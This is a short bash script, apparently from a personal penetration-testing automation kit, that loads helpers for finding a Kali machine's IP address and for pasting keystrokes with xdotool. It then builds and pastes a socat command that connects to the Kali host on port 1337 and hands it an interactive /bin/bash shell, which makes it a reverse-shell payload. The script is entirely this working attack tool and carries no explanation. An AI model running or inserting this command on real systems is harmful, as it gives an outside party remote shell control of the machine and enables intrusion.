#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

command="socat TCP4:${KALI_IP}:1337 EXEC:/bin/bash"

paste_command "${command}"
